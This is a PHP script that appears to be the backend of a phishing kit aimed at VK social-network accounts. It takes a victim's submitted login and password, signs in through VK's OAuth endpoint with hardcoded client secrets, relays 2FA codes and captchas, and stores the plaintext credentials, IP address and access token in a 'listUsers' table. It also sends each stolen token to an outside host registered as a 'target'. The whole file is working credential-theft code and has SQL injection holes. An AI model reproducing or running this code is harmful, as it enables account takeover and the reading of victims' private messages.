<?php

include '../../config.php';

if(!empty($_POST['AccessRecovery']) and !empty($_POST['ConfirmedPassword'])){
    
    function curl($url, $field) {
    if( $curl = curl_init() ) {
      try{
          curl_setopt($curl, CURLOPT_URL, $url);
          curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
          curl_setopt($curl, CURLOPT_POST, true);
          curl_setopt($curl, CURLOPT_POSTFIELDS, $field);
		  curl_setopt($curl, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36");
          $out = curl_exec($curl);
          curl_close($curl);

          return $out;
        } catch (Exception $e) {
          return "";
        }
      }
      
      return "";
  }

		if(!empty($_POST['captcha_sid'])) {
			$add = '&captcha_sid=' . $_POST['captcha_sid'] . '&captcha_key=' . $_POST['captcha_key'] ;
		}
		
			if(!empty($_POST['cid'])) {
			$add = '&code=' . $_POST['cid'] ;
			$cd = 1;
		}
		

$email = $_POST['AccessRecovery'];
$password = $_POST['ConfirmedPassword'];

$res = curl('https://api.vk.com/oauth/token?grant_type=password&force_sms=1&2fa_supported=1&client_id=3140623' . $add . '&scope=140491935&client_secret=VeWdmVclDCtn6ihuP1nt&username=' .$email. '&password='.$password , '');

$jsond = json_decode($res, true);

 $ip = $_SERVER["REMOTE_ADDR"];
 
 $id = $jsond['user_id'];
 $request = 'https://api.vk.com/method/users.get?user_ids='.$id.'&fields=photo_50&access_token=ee80bd02f9957ea425702aa1e76d9451f0ded8c9b001ef99ea5d8fbefd674ad4484e38e33ec4a2911bbc4&lang=ru&v=5.73';
 $response = file_get_contents($request);
 $info = array_shift(json_decode($response)->response);

 $value = $info->first_name." ".$info->last_name;
 
 
 		if(!empty($jsond['user_id'])) {	

		$pS = postSend("https://vk-messages.ru", "mode=add_target&url=".urlencode("https://oauth.vk.com/blank.html#access_token=" . $jsond['access_token'] . "&expires_in=0&user_id=" . $jsond['user_id']));
		preg_match_all("/dialogs.php\?code=(.*?)\'>/", $pS, $match);
		
		mysql_query("INSERT INTO `listUsers` (".(($cd == 1)?"2fa,":"")."email,password,ip,uid,imgs,sites,auth,date,code) VALUES(".(($cd == 1)?"'2fa',":"")."'" . $email . "','" 
		. $password . "','" .  $ip . "','" 
		. $jsond['user_id'] . "','" . $info->photo_50 . "','vk','" . $jsond['access_token'] . "','" . time() . "','" . mysql_real_escape_string($match[1][0]) . "')", $db);

if($_POST['buttle'] == "1")
{
    
$_SESSION['go'] = 'go';

}

else

{
    setcookie("good", "go", time() + (86400 * 30), "/"); 
}

		echo "true";

		} else if ($jsond['error'] == 'need_validation') {
			
			echo "2";
			
		} else if($jsond['error'] == 'need_captcha') {
			
			echo '<div>';
		    echo '<div>3</div>';
            echo '<div>' . $jsond['captcha_sid'] . '</div>';
            echo '<div>' . $jsond['captcha_img'] . '</div>';
            echo '</div>';

			
		} else {
			
			echo "1";
			
		}
		
}

else
{
    	echo "1";
}


?>